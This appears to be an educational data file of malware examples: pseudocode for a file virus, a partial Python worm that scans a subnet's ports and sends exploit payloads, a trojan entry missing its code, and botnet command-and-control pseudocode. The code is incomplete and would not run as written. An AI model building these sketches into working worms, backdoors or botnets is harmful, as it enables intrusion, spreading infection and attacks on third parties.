examples.title: Simple Virus Replication Logic
examples.description: Pseudocode demonstrating how a virus might attach to executable files
examples.code:
PROCEDURE InfectFile(targetFile)
  BEGIN
    IF IsExecutable(targetFile) AND NOT IsInfected(targetFile) THEN
      virusCode <- READVirusCode()
      originalEntryPoint <- GETEntryPoint(targetFile)
      modifiedEntryPoint <- FINDEmptySpace(targetFile)
      WRITE virusCode TO targetFile AT modifiedEntryPoint
      MODIFY targetFile EntryPoint TO modifiedEntryPoint
      STORE originalEntryPoint IN virusCode
      RETURN TRUE
    END IF
    RETURN FALSE
  END PROCEDURE

PROCEDURE SpreadVirus()
  BEGIN
    fileList <- SCANDirectory(CurrentDirectory)
    FOR EACH file IN fileList DO
      InfectFile(file)
    END FOR
  END PROCEDURE
examples.explanation: This pseudocode shows how a file virus locates executable files, finds space to embed its code, modifies the entry point to execute virus code first, and stores the original code to run normally afterward.

examples.title: Simple Worm Propagation Simulation
examples.description: Python code demonstrating worm-like behavior scanning and exploiting network machines
examples.code:
import socket
import subprocess

def scan_and_infect(target_ip, exploit_port):
    """Simulate worm scanning and exploitation"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, exploit_port))
        
        if result == 0:
            print(f"[+] Port open on {target_ip}:{exploit_port}")
            # In real attack: send exploit payload
            payload = create_exploit_payload()
            sock.send(payload)
            # In real attack: receive and execute remote shell
            print(f"[*] Exploit sent to {target_ip}")
        sock.close()
    except:
        pass

def worm_propagate(network_range):
    """Simulate self-replicating worm behavior"""
    base_ip = network_range.split('.')[0:3]
    for subnet in range(1, 255):
        target_ip = f"{base_ip[0]}.{base_ip[1]}.{base_ip[2]}.{subnet}"
        # Common exploit ports
        for port in [445, 3389, 22, 80]:
            scan_and_infect(target_ip, port)
            # Self-replicate if exploitation successful
            if exploitation_successful:
                worm_propagate(target_ip)

if __name__ == "__main__":
    worm_propagate("192.168.1.0/24")
examples.explanation: This Python code simulates how a worm scans a network for vulnerable systems and attempts to exploit them. It demonstrates the automated propagation characteristic that distinguishes worms from viruses. Note: This is for educational purposes only.

examples.title: Basic Trojan Structure (Educational)
examples.description: C code showing structure of how trojans establish backdoor connections
examples.explanation: This C code demonstrates the structure of a trojan's backdoor functionality - connecting to a remote command server and executing received commands. In real trojans, this code is hidden within seemingly legitimate software to deceive users.

examples.title: Botnet C2 Command Handler
examples.description: Pseudocode showing how a C2 server might issue commands to bot clients
examples.code:
// Command and Control Server
PROCEDURE HandleBotConnection(botSocket)
  BEGIN
    authenticated <- AuthenticateBot(botSocket)
    IF NOT authenticated THEN
      CLOSE connection
      RETURN
    END IF
    
    WHILE connection_active DO
      command <- ReceiveCommand(botSocket)
      
      SWITCH command.type
        CASE "DDOS":
          targetIP <- command.target
          targetPort <- command.port
          LaunchDDoS(botList, targetIP, targetPort)
        
        CASE "SPAM":
          emailList <- command.recipients
          SendSpam(botList, emailList)
        
        CASE "MINING":
          walletAddress <- command.wallet
          StartCryptoMining(botList, walletAddress)
        
        CASE "UPDATE":
          newPayload <- command.malware
          DistributeUpdate(botList, newPayload)
        
        CASE "SCAN":
          targetRange <- command.network
          PerformRecon(botList, targetRange)
      END SWITCH
      
      SendStatus(botSocket, "COMPLETED")
    END WHILE
  END PROCEDURE

// Bot Client Side
PROCEDURE ConnectToC2()
  BEGIN
    WHILE TRUE DO
      c2Socket <- CONNECT(c2_server, c2_port)
      IF connection_successful THEN
        REGISTER(c2Socket, bot_id)
        WHILE connected DO
          command <- WAIT_FOR_COMMAND(c2Socket)
          EXECUTE(command)
        END WHILE
      END IF
      SLEEP(reconnect_interval)
    END WHILE
  END PROCEDURE
examples.explanation: This pseudocode illustrates the botnet architecture - showing how the C2 server issues different types of commands (DDoS, spam, crypto mining, updates) and how bots connect and wait for instructions.
examples.spaceComplexity: O(k) where k is number of bots
